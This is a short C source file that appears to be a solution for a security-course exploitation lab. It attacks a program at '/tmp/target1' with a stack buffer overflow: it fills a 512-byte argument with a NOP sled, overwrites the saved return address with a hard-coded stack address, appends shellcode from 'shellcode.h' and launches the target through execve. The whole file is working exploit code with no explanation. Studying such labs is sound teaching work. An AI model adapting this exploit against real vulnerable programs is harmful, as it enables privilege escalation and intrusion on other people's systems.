#include "shellcode.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target1"

#define NOP 0x90
#define SIZE_ARG 512
#define BUFF_SIZE 256

int main(void) {
  unsigned int shell_exec_loc = 0xBFFFFEF6;
  char *arg = malloc(SIZE_ARG * sizeof(char));
  memset(arg, NOP, SIZE_ARG);
  memcpy(arg + BUFF_SIZE + 4, &shell_exec_loc, sizeof(shell_exec_loc));
  memcpy(arg + BUFF_SIZE + 8, shellcode, sizeof(shellcode) - 1);

  char *args[] = {TARGET, arg, NULL};
  char *env[] = {NULL};
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
